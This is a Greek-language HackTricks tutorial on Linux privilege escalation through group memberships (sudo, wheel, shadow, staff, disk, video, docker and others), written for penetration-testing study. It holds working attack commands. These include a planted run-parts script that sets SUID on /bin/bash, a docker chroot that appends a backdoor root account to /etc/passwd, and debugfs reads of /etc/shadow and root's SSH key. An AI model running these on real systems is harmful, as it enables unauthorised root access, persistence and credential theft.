# Ενδιαφέρουσες ομάδες - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Ομάδες Sudo/διαχειριστών

### **PE - Method 1**

**Μερικές φορές**, η πολιτική του συστήματος **/etc/sudoers** (ή ένα αρχείο που περιλαμβάνεται από αυτήν) περιέχει καταχωρίσεις όπως:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Αυτό σημαίνει ότι κάθε χρήστης που αντιστοιχεί σε οποιαδήποτε από τις δύο εγγραφές μπορεί να εκτελέσει οποιαδήποτε εντολή ως οποιοσδήποτε χρήστης-στόχος μέσω του `sudo` (με την επιφύλαξη των υπόλοιπων κανόνων πολιτικής).<sup>[[3]](#references)</sup>

Αν ισχύει αυτό, για να **γίνεις root, μπορείς απλώς να εκτελέσεις**:

```
sudo su
```

Αν το `sudo -l` επιτρέπει περιορισμένη εκτέλεση του `adduser` με μόνο ένα όνομα χρήστη, ελέγξτε αν δημιουργεί μια ομώνυμη κύρια ομάδα που δεν υπάρχει ήδη. Ένας νέος λογαριασμός σε αυτή την ομάδα μπορεί να αποκτήσει προνόμια, αν η ενεργή πολιτική sudoers τα παραχωρεί ήδη στο `%group`. Επαληθεύστε τόσο τη συμπεριφορά δημιουργίας ομάδας όσο και τον κανόνα της ομάδας, προτού θεωρήσετε ότι πρόκειται για διαδρομή privilege escalation. Η δημιουργία λογαριασμού τροποποιεί το σύστημα, επομένως ελέγξτε πρώτα την πολιτική.

### PE - Method 2

Βρείτε όλα τα suid binaries και ελέγξτε αν υπάρχει το binary **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Αν το **pkexec είναι SUID binary**, μπορεί να εκτελέσει ένα πρόγραμμα ως άλλος χρήστης μόνο όταν το polkit εγκρίνει την απαιτούμενη ενέργεια· το SUID bit από μόνο του δεν εγγυάται πρόσβαση root. Ελέγξτε την εγκατεστημένη πολιτική και την εξουσιοδότηση της συνεδρίας-στόχου, αντί να υποθέτετε ότι αρκεί η συμμετοχή στις ομάδες **sudo** ή **admin**.<sup>[[4]](#references)[[5]](#references)</sup>

Για την ξεχωριστή διαδρομή [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), επαληθεύστε πρώτα ότι το `pkexec` είναι εκτελέσιμο αρχείο **SUID με ιδιοκτήτη root**. Ένα εγκατεστημένο binary χωρίς αυτό το bit δεν αποτελεί την τοπική κλιμάκωση SUID που περιγράφεται στη γνωστοποίηση. Η συμβολοσειρά έκδοσης upstream αποτελεί μόνο ένδειξη: οι διανομές μπορούν να [ενσωματώσουν τη διόρθωση σε παλαιότερες εκδόσεις πακέτων](https://ubuntu.com/security/CVE-2021-4034), οπότε ελέγξτε το εγκατεστημένο πακέτο του κατασκευαστή και τα μέτρα μετριασμού πριν το χαρακτηρίσετε ευάλωτο.

Το [CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) αφορά διαφορετική διαδρομή polkit: μια συνθήκη ανταγωνισμού στην εξουσιοδότηση D-Bus, όχι ένα ελάττωμα SUID του `pkexec`. Ελέγξτε το εγκατεστημένο πακέτο polkit του κατασκευαστή και αν μια προσβάσιμη προνομιούχα ενέργεια D-Bus μπορεί να επιφέρει χρήσιμη αλλαγή· μια διαδρομή δημιουργίας λογαριασμού απαιτεί επίσης κατάλληλη υπηρεσία, όπως το AccountsService, ενώ η πρόσβαση sudo της νέας ομάδας εξαρτάται από την ενεργή πολιτική sudo. Μια αναφερόμενη έκδοση polkit ή μια εγκατεστημένη υπηρεσία αποτελούν μόνο πιθανή ένδειξη, ειδικά όταν οι κατασκευαστές [ενσωματώνουν διορθώσεις σε παλαιότερες εκδόσεις](https://access.redhat.com/security/cve/cve-2021-3560). Η παθητική απαρίθμηση δεν πρέπει να ενεργοποιεί τη συνθήκη ανταγωνισμού.

Σε διανομές που εξακολουθούν να χρησιμοποιούν το παλαιότερο backend Local Authority, ελέγξτε τους κανόνες ομάδων του με:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Τα σχετικά ονόματα ομάδων και οι προεπιλογές διαφέρουν ανά διανομή· μια ομάδα είναι χρήσιμη εδώ μόνο αν αναφέρεται στην τοπική πολιτική.<sup>[[5]](#references)</sup>

Για να **γίνεις root, μπορείς να εκτελέσεις**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Αν προσπαθήσετε να εκτελέσετε το **pkexec** και λάβετε αυτό το **σφάλμα**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Σε μια συνεδρία SSH χωρίς καταχωρισμένο authentication agent, το `pkexec` μπορεί να αποτύχει με αυτό το σφάλμα, ακόμη κι αν η πολιτική θα επέτρεπε διαφορετικά την ενέργεια· το polkit τεκμηριώνει το `pkttyagent` ως text authentication agent για συνεδρίες χωρίς desktop. Η ακριβής συμπεριφορά εξαρτάται από την έκδοση και τη διανομή, γι’ αυτό επαληθεύστε την τοπική πολιτική και τη ρύθμιση του agent. Μια λύση που αναφέρθηκε για επηρεαζόμενες εκδόσεις του NixOS χρησιμοποιεί **2 διαφορετικές συνεδρίες SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Ένα ACL που απαγορεύει σε έναν λογαριασμό την πρόσβαση στο `su` αφορά αυτό το εκτελέσιμο, όχι κάθε τρόπο εκτέλεσης μιας ενέργειας που επιτρέπεται σε διαχειριστή. Αν διαπιστευτήριο διαχειριστή έχει εκτεθεί ανεξάρτητα, εξετάστε αν η ισχύουσα πολιτική polkit επιτρέπει μια ξεχωριστή ενέργεια, όπως την εκκίνηση μιας παροδικής υπηρεσίας συστήματος μέσω του `systemd-run`, ποια ταυτότητα δέχεται ο authentication agent και ποια ταυτότητα θα χρησιμοποιήσει η υπηρεσία που θα προκύψει. [Το polkit διακρίνει την ταυτοποίηση ως κάτοχος της συνεδρίας από την ταυτοποίηση ως διαχειριστής](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), ενώ [το systemd-run μπορεί να ζητήσει μια παροδική υπηρεσία από τον system manager](https://systemd.io/CONTROL_GROUP_INTERFACE/). Μια καταχώριση ιστορικού, μια εγκατεστημένη εντολή ή ένα αναγνώσιμο αρχείο πολιτικής από μόνα τους δεν αποδεικνύουν εξουσιοδότηση ή εγκυρότητα διαπιστευτηρίων· η παθητική εξέταση δεν πρέπει να υποβάλλει διαπιστευτήρια ούτε να εκκινεί μονάδα.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Group

Μερικές φορές, μια πολιτική sudoers μπορεί επίσης να περιέχει αυτήν την καταχώριση:

```
%wheel	ALL=(ALL:ALL) ALL
```

Αυτό σημαίνει ότι οποιοσδήποτε χρήστης αντιστοιχεί στην καταχώριση μπορεί να εκτελέσει οποιαδήποτε εντολή ως οποιοσδήποτε χρήστης-στόχος μέσω του sudo (με την επιφύλαξη των υπόλοιπων κανόνων πολιτικής).<sup>[[3]](#references)</sup>

Αν ισχύει αυτό, για να **γίνετε root μπορείτε απλώς να εκτελέσετε**:

```
sudo su
```

## Ομάδα shadow

Σε συστήματα όπου τα δικαιώματα το επιτρέπουν, οι χρήστες στην ομάδα **shadow** μπορούν να **διαβάσουν** το **/etc/shadow**· επαληθεύστε τα πραγματικά δικαιώματα και τις ACLs στο σύστημα-στόχο:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Λοιπόν, διαβάστε το αρχείο και προσπαθήστε να κάνετε **crack σε μερικά hashes**.

Μια σημαντική λεπτομέρεια για την κατάσταση κλειδώματος κατά την αξιολόγηση των hashes:
- Οι εγγραφές με `!` ή `*` γενικά δεν επιτρέπουν μη διαδραστική σύνδεση με κωδικό πρόσβασης.
- Το `!hash` σημαίνει ότι ο κωδικός πρόσβασης ήταν κλειδωμένος· οι υπόλοιποι χαρακτήρες αντιστοιχούν στο πεδίο κωδικού πρόσβασης πριν κλειδωθεί.
- Ένα πεδίο που περιέχει `*` δεν είναι έγκυρο hash `crypt(3)` και αποτρέπει τη σύνδεση UNIX με κωδικό πρόσβασης· μην συμπεραίνετε από αυτό αν είχε οριστεί προηγουμένως κωδικός πρόσβασης.
Αυτό είναι χρήσιμο για την ταξινόμηση λογαριασμών, ακόμη κι όταν η απευθείας σύνδεση είναι αποκλεισμένη.<sup>[[6]](#references)</sup>

## Ομάδα staff

**staff**: Επιτρέπει στους χρήστες να προσθέτουν τοπικές τροποποιήσεις στο σύστημα (`/usr/local`) χωρίς να χρειάζονται προνόμια root (σημειώστε ότι τα εκτελέσιμα αρχεία στο `/usr/local/bin` περιλαμβάνονται στη μεταβλητή PATH κάθε χρήστη και μπορεί να «υπερισχύσουν» των εκτελέσιμων αρχείων με το ίδιο όνομα στους καταλόγους `/bin` και `/usr/bin`). Συγκρίνετέ την με την ομάδα «adm», η οποία σχετίζεται περισσότερο με την παρακολούθηση/ασφάλεια.<sup>[[2]](#references)[[7]](#references)</sup>

Σε διαμορφώσεις Debian όπου το `/usr/local/bin` προηγείται του `/usr/bin` στο `PATH` (όπως στα παρακάτω παραδείγματα), μια εντολή χωρίς προσδιορισμένο κατάλογο εκτελεί πρώτα το αντίγραφο από το `/usr/local/bin`· επιβεβαιώστε την πραγματική τιμή του `PATH` στο σύστημα-στόχο.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Αν μια διεργασία με αυξημένα προνόμια επιλύει μια εντολή χωρίς πλήρη διαδρομή μέσω ενός εγγράψιμου `/usr/local/bin`, η αντικατάσταση αυτής της εντολής μπορεί να εκτελεστεί με τα προνόμια της διεργασίας· πριν από τη δοκιμή, επιβεβαιώστε την πραγματική διαδρομή και τον τρόπο ενεργοποίησης.

Σε συστήματα Ubuntu, το `pam_motd` εκτελεί εκτελέσιμα scripts μέσω του `run-parts --lsbsysinit` ως root κατά τη σύνδεση· οι εργασίες cron μπορεί επίσης να χρησιμοποιούν το `run-parts`, αλλά αυτό εξαρτάται από τη διανομή και τη διαμόρφωση.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Σε μια νέα σύνδεση SSH, το `pspy` μπορεί να βοηθήσει να επιβεβαιώσουμε αν αυτή η διαδρομή εκτελείται πράγματι στο σύστημα-στόχο· μπορεί να παρατηρεί γραμμές εντολών διεργασιών χωρίς δικαιώματα root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Ομάδα disk

Η συμμετοχή στην ομάδα **disk** μπορεί να παρέχει άμεση πρόσβαση σε συσκευές block και συχνά είναι **σχεδόν ισοδύναμη με πρόσβαση root**· το Debian την περιγράφει ως σε μεγάλο βαθμό ισοδύναμη με root, αλλά επαληθεύστε τα πραγματικά δικαιώματα των συσκευών και τη διάταξη αποθήκευσης στο σύστημα-στόχο.<sup>[[7]](#references)</sup>

Συνηθισμένες διαδρομές συσκευών περιλαμβάνουν τις `/dev/sd*`, αλλά τα NVMe και άλλες διατάξεις αποθήκευσης χρησιμοποιούν διαφορετικές ονομασίες.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

Το `debugfs` λειτουργεί σε filesystems ext2/ext3/ext4· διαδρομές όπως `/root` και `/etc/shadow` παραπάνω είναι αρχεία μέσα στο ανοιγμένο filesystem, ενώ το δεύτερο όρισμα της εντολής `dump` είναι μια διαδρομή εξόδου στο εγγενές filesystem.<sup>[[8]](#references)</sup> Για παράδειγμα, αυτό εξάγει το `/tmp/asd1.txt` από το ανοιγμένο filesystem στο `/tmp/asd2.txt` στο εγγενές filesystem:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Η επιλογή `-w` ανοίγει το filesystem με δικαιώματα ανάγνωσης και εγγραφής, ενώ η εντολή `write` αντιγράφει ένα εγγενές αρχείο στο ανοιγμένο filesystem. Αποφύγετε να τη χρησιμοποιείτε σε προσαρτημένο ενεργό filesystem, καθώς οι άμεσες αλλαγές μπορεί να καταστρέψουν το filesystem· όταν είναι δυνατόν, εργαστείτε με offline image.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Ομάδα Video

Με την εντολή `w` μπορείτε να δείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανιστεί έξοδος όπως η παρακάτω.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Η καταχώριση **tty1** προσδιορίζει την πρώτη εικονική κονσόλα Linux· από μόνη της δεν αποδεικνύει ότι υπάρχει φυσικά κάποιος χρήστης στο μηχάνημα, ειδικά σε containers ή άλλα περιβάλλοντα.<sup>[[21]](#references)</sup>

Σε συστήματα που διαθέτουν συσκευή framebuffer με δυνατότητα ανάγνωσης, η συμμετοχή στην ομάδα **video** μπορεί να παρέχει πρόσβαση σε αυτήν τη συσκευή. Η διεπαφή framebuffer του Linux τεκμηριώνει το `/dev/fb0` ως συσκευή μνήμης με δυνατότητα ανάγνωσης, από την οποία μπορούν να αντιγραφούν δεδομένα για τη λήψη στιγμιότυπου οθόνης· η διαδρομή `/sys/class/graphics/fb0/virtual_size` είναι διαθέσιμη μόνο όπου υπάρχει αυτό το χαρακτηριστικό fbdev στο sysfs, επομένως ελέγξτε πρώτα τον στόχο.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Αν η εγκατεστημένη έκδοση του **GIMP** διαθέτει εισαγωγέα ακατέργαστων δεδομένων, ανοίξτε το **`screen.raw`** με αυτόν· η υποστήριξη και τα στοιχεία ελέγχου διαφέρουν ανάλογα με την έκδοση και το πρόσθετο.<sup>[[22]](#references)</sup>

![Ομάδα Disk - Ομάδα Video: Για να ανοίξετε την ακατέργαστη εικόνα, μπορείτε να χρησιμοποιήσετε το GIMP, να επιλέξετε το αρχείο screen.raw και ως τύπο αρχείου να επιλέξετε Raw image data](<../../../images/image (463).png>)

Ορίστε το πλάτος και το ύψος της εικόνας ώστε να αντιστοιχούν στη γεωμετρία του framebuffer· δοκιμάστε τις διαθέσιμες μορφές pixel/τύπους εικόνας μέχρι το αποτέλεσμα να είναι ευανάγνωστο.<sup>[[9]](#references)</sup>

![Ομάδα Disk - Ομάδα Video: Έπειτα, αλλάξτε το πλάτος και το ύψος στις τιμές που χρησιμοποιούνται στην οθόνη και δοκιμάστε διαφορετικούς τύπους εικόνας (και επιλέξτε αυτόν που εμφανίζει καλύτερα την οθόνη)](<../../../images/image (317).png>)

## Ομάδα root

Η συμμετοχή στην ομάδα **root** δεν παρέχει το UID του root, αλλά τα αρχεία με δικαιώματα εγγραφής από την ομάδα, τα οποία ανήκουν στον `root`, μπορεί και πάλι να παρουσιάζουν ενδιαφέρον όταν τα χρησιμοποιούν προνομιούχες υπηρεσίες ή βιβλιοθήκες. Επαληθεύστε τα πραγματικά δικαιώματα του αρχείου και τον τρόπο χρήσης του πριν το θεωρήσετε πιθανή οδό για privilege escalation.

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη της ομάδας root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

Η συμμετοχή στην ομάδα `docker` παρέχει πρόσβαση επιπέδου root στο Docker daemon σε τυπικές εγκαταστάσεις rootful. Επειδή τα bind mounts είναι read-write από προεπιλογή, ένας χρήστης που μπορεί να ελέγχει αυτό το daemon μπορεί να προσαρτήσει το `/` του host σε ένα container και να τροποποιήσει αρχεία του host· αυτό ουσιαστικά παρέχει δικαιώματα root στον host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Η συμμετοχή σε ομάδες ενδέχεται να μην είναι συγχρονισμένη μεταξύ των `/etc/group`, `/etc/gshadow` και του token της τρέχουσας διεργασίας. Αν ένας χρήστης δεν εμφανίζεται στην έξοδο της `id -nG`, αλλά η `newgrp docker` εκτελείται με επιτυχία, ελέγξτε την ομάδα που εμφανίζει η `id` στο νέο shell και δοκιμάστε αν το Docker socket είναι πράγματι εγγράψιμο και αν εξυπηρετεί ένα rootful daemon. Το όνομα της ομάδας από μόνο του δεν αποδεικνύει ότι υπάρχει έλεγχος του host. Περιορίστε χρονικά κάθε αυτοματοποιημένη δοκιμή `newgrp`, ώστε ένα αίτημα κωδικού πρόσβασης να μην καθυστερήσει την απαρίθμηση.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Τέλος, αν δεν σου αρέσει κάποια από τις παραπάνω προτάσεις ή δεν λειτουργούν για κάποιον λόγο (π.χ. firewall στο Docker API), μπορείς πάντα να δοκιμάσεις να **εκτελέσεις ένα privileged container και να κάνεις escape από αυτό**, όπως εξηγείται εδώ:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Αν έχεις δικαιώματα εγγραφής στο docker socket, διάβασε [**αυτή την ανάρτηση για το πώς να κλιμακώσεις τα προνόμιά σου κάνοντας κατάχρηση του docker socket**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Ομάδα lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Ομάδα Adm

Συνήθως τα **μέλη** της ομάδας **`adm`** έχουν δικαιώματα **ανάγνωσης αρχείων καταγραφής** που βρίσκονται μέσα στο _/var/log/_.\
Επομένως, αν έχεις παραβιάσει έναν χρήστη αυτής της ομάδας, πρέπει οπωσδήποτε να **ελέγξεις τα αρχεία καταγραφής**.<sup>[[7]](#references)</sup>

## Ομάδες Backup / Operator / lp / Mail

Αυτές οι ομάδες έχουν σημασίες που εξαρτώνται από την υπηρεσία και τη διανομή. Το Debian τεκμηριώνει την ομάδα `backup` για ανάθεση εργασιών δημιουργίας αντιγράφων ασφαλείας/επαναφοράς, την `lp` για δαίμονες εκτυπωτών και την `mail` για το `/var/mail`, επομένως έλεγξε τα τοπικά δικαιώματα προτού θεωρήσεις ότι η συμμετοχή σε αυτές αποτελεί διαδρομή κλιμάκωσης προνομίων.<sup>[[7]](#references)</sup>

Συχνά αποτελούν διαδρομές **ανακάλυψης διαπιστευτηρίων** και όχι άμεσες διαδρομές προς root:
- **backup**: ενδέχεται να εκθέτει αρχεία αρχειοθέτησης με ρυθμίσεις, κλειδιά, dumps βάσεων δεδομένων ή tokens.
- **operator**: πρόσβαση σε λειτουργίες που εξαρτάται από την πλατφόρμα και μπορεί να διαρρεύσει ευαίσθητα δεδομένα χρόνου εκτέλεσης.
- **lp**: οι ουρές/περιοχές προσωρινής αποθήκευσης εκτυπώσεων μπορεί να περιέχουν το περιεχόμενο εγγράφων.
- **mail**: οι περιοχές αποθήκευσης email μπορεί να εκθέτουν συνδέσμους επαναφοράς, OTP και εσωτερικά διαπιστευτήρια.

Θεώρησε τη συμμετοχή σε αυτές τις ομάδες εύρημα υψηλής αξίας που αφορά έκθεση δεδομένων και συνέχισε την έρευνα ελέγχοντας για επαναχρησιμοποίηση κωδικών πρόσβασης/token.

## Ομάδα Auth

Στο OpenBSD, όταν έχει ρυθμιστεί το S/Key, το `/etc/skey` ανήκει στον `root:auth` και η πρόσβαση στις εγγραφές του απαιτεί συμμετοχή στην ομάδα `auth`. Οι εγγραφές YubiKey αποθηκεύονται στο `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Μια ευάλωτη ρύθμιση του OpenBSD 6.6 με ενεργοποιημένο το S/Key ή το YubiKey επέτρεπε σε τοπικούς χρήστες με προνόμια `auth` να αποκτήσουν δικαιώματα root· η Qualys τεκμηριώνει τις προϋποθέσεις και την αλυσίδα exploit, ενώ το συνδεδεμένο PoC την υλοποιεί.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Πιστοποίηση pkexec/pkttyagent χωρίς συνεδρία GUI (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Εγχειρίδιο αναφοράς polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Εγχειρίδιο αναφοράς polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Εγχειρίδιο ασφάλισης του Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Σελίδα εγχειριδίου Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Η συσκευή Frame Buffer — Τεκμηρίωση του Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — παρακολούθηση διεργασιών Linux χωρίς προνόμια](https://github.com/DominicBreuker/pspy)
- [13] [Ασφάλεια του Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Διαχείριση του Docker ως χρήστης χωρίς δικαιώματα root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Εκτέλεση containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Σελίδες εγχειριδίου OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Σελίδες εγχειριδίου OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Ευπάθειες πιστοποίησης στο OpenBSD — Συμβουλευτική ασφάλειας της Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC τοπικού exploit](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Δεσμευμένες συσκευές Linux (έκδοση 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Εισαγωγή και εξαγωγή εικόνων — Τεκμηρίωση GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
